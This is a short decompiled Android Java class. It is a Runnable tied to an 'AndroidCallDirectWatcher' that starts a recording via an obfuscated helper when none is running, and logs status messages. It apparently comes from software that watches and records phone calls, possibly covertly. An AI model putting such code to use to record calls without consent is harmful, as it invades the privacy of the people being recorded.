package com.network.android;

import android.content.Context;
import com.network.media.r;

final class a implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f41a;
    final /* synthetic */ AndroidCallDirectWatcher b;

    a(AndroidCallDirectWatcher androidCallDirectWatcher, Context context) {
        this.b = androidCallDirectWatcher;
        this.f41a = context;
    }

    public final void run() {
        if (r.b() == null) {
            com.network.android.c.a.a.a("AndroidCallDirectWatcher record starting to record");
            r.a(this.f41a);
            return;
        }
        com.network.android.c.a.a.a("AndroidCallDirectWatcher record not equal to null. we are not recording");
    }
}
